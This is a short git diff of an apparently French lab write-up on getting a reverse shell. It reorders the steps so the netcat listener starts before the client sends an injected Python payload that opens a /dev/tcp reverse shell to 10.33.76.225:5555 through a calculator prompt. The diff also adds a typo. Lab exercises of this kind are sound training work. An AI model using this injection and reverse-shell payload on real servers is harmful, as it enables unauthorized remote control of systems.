@@ -98,14 +98,14 @@ Veuillez saisir une opération arithmétique : __import__('os').system('ping 10.
 🌞 **Obtenez un reverse shell sur le serveur**
 
 ```bash
-$ python3 client.py
-Veuillez saisir une opération arithmétique : __import__('os').system('sh -i >& /dev/tcp/10.33.76.225/5555 0>&1')
+$ nc -lnvp 5555
 ```
 
-Depuis un autre terminal :
+Depuis un autre termninal :
 
 ```bash
-$ nc -lnvp 5555
+$ python3 client.py
+Veuillez saisir une opération arithmétique : __import__('os').system('sh -i >& /dev/tcp/10.33.76.225/5555 0>&1')
 ```
 
 🌞 **Pwn**
